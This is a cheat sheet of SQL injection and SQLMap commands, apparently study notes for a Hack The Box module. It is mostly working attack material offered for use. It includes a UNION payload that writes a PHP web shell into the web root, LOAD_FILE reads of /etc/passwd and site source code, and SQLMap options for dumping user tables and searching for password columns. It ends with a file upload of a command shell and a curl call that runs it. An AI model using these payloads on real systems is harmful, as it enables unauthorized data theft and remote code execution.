## SQL Injection Fundamentals x SQLMap

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

```bash
- Division (/), Multiplication (*), and Modulus (%)
- Addition (+) and subtraction (-)
- Comparison (=, >, <, <=, >=, !=, LIKE)
- NOT (!)
- AND (&&)
- OR (||)

- - URL Encoded
- ' 	%27
- " 	%22
- # 	%23
- ; 	%3B
- ) 	%29
```

## Connect to mysql db
```bash
 mysql -u root -p
 mysql -u root -p$PASSWORD
 mysql -u root -h docker.hackthebox.eu -P 3306 -p 
 ```

 ## SQL
```sql
SHOW DATABASES;
SHOW TABLES;
SELECT * FROM - ;
SELECT * FROM -  LIMIT 5;
SELECT * FROM -  LIKE 'admin%'
```

### Enumerate current users
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
SELECT super_priv FROM mysql.user
```

### Load & Write Files
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE("/var/www/html/search.php"); # Leak code of search.php
SELECT 'file written successfully!' into outfile '/var/www/html/proof.txt'
# Webshell
# Target : http://SERVER_IP:PORT/shell.php?0=id
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

## SQLMap
```bash
sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

# Automated exploitation
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
# Sample data
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
# Burp requests inside txt file
sqlmap -r req.txt 
# Use session cookie & csrf token
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
# Prefix & Suffix
sqlmap ... --prefix="%'))" --suffix="-- -"
# Level 5 & Risk 3 <3
sqlmap ... --risk 3 --level 5
# -D DB_NAME & --tables -> list tables
sqlmap ... --tables -D testdb
# -T TABLE_NAME -D DB_NAME
sqlmap ... --dump -T users -D testdb
# -C COLUMN_NAME1,COLUMN_NAME2
sqlmap ... --dump -T users -D testdb -C name,surname
sqlmap ... --dump -T users -D testdb -C name,surname
sqlmap -u "$TARGET_URI" --dump -T users -D testdb -where="name LIKE 'adm%'"
# Dump schema
--schema
# Search table "user"
--search -T user
# Search column "pass"
--search -C pass
# Dump the data 👀
--dump
# Check current permissions
--is-dba
# Read & Write file to RCE
--file-read "/etc/passwd"
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
--file-write "shell.php" --file-dest "/var/www/html/shell.php"
curl http://www.example.com/shell.php?cmd=ls+-la
```